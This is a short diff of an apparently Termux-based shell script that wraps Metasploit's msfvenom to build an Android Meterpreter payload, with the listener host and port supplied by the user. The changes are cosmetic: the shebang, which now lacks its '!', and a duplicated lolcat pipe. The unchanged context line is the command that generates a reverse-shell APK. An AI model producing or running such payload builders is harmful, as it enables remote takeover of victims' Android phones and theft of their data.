@@ -1,4 +1,4 @@
-#! /system/bin/
+#/data/data/com.termux/files/usr/bin/bash
 
 clear
 
@@ -61,7 +61,7 @@ do
 	fi
 done
 
-echo "Generating Payload Please Wait..." |lolcat  |lolcat -a
+echo "Generating Payload Please Wait..." |lolcat -a
 
 ~/metasploit-framework/msfvenom -p android/meterpreter/$payload LHOST=$host LPORT=$port --arch dalvik --platform android R > $path |lolcat -a
 
